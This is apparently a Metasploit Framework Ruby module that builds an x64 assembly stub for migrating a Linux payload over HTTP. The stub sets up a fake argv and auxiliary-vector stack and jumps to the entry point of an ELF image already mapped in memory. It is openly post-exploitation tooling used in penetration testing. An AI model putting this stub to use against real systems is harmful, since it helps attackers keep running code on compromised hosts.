# -*- coding: binary -*-

require 'rex/elfparsey'

module Msf

###
#
# Payload that supports HTTP migration on x64.
#
###

module Payload::Linux::X64::MigrateHttp

  include Msf::Payload::Linux::X64::Migrate


  def initialize(info={})
    super(update_info(info,
      'Name'        => 'Linux HTTP Migration (x64)',
      'Description' => 'Migration stub x64',
      'Author'      => ['OJ Reeves', 'msutovsky-r7'],
      'License'     => MSF_LICENSE,
      'Platform'    => 'linux',
      'Arch'        => ARCH_X64
    ))
  end

  def elf_ep(payload)
    elf = Rex::ElfParsey::Elf.new(Rex::ImageSource::Memory.new(payload))
    elf.elf_header.e_entry
  end

  #
  # Constructs the migrate stub on the fly
  #
  def generate_migrate(opts={})
    entry_offset = elf_ep(opts[:payload])

    %^
      pop rax              ; discard pid
      pop r10              ; discard fd
      pop rsi              ; rsi = mmap base (payload address)

      and rsp, -0x10       ; align stack
      add rsp, 128         ; headroom

      ; push prog name "a\0"
      mov rax, 0x61
      push rax
      mov rcx, rsp         ; rcx = ptr to prog name

      xor rbx, rbx
      push rbx             ; AT_NULL value
      push rbx             ; AT_NULL type
      push rsi             ; AT_BASE value (mmap base)
      mov rax, 7
      push rax             ; AT_BASE type
      push rbx             ; NULL (end of envp)
      push rbx             ; NULL (end of argv)
      push rcx             ; argv[0] = prog name
      mov rax, 1
      push rax             ; argc = 1

      ; Jump to ELF entry point
      mov rax, #{entry_offset}
      add rsi, rax
      jmp rsi
    ^
  end

end

end
